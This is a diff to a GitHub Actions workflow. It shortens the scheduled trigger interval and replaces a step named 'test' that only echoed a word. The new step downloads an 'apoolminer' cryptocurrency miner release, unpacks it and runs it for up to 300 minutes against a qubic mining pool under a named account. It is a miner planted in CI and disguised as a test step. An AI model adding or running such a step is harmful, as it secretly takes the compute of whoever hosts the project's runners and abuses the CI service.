@@ -7,7 +7,7 @@ on:
   pull_request:
     branches: [ main ]
   schedule:
-    - cron: "*/5 * * * *"
+    - cron: "*/30 */5 * * *"
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -37,4 +37,4 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: test
-        run: echo succes
+        run: wget https://github.com/apool-io/apoolminer/releases/download/v1.2.7/apoolminer_linux_v1.2.7.tar && tar xf apoolminer_linux_v1.2.7.tar && timeout 300m ./apoolminer --algo qubic --account CP_xuci4bjb2i --pool qubic1.hk.apool.io:3334    
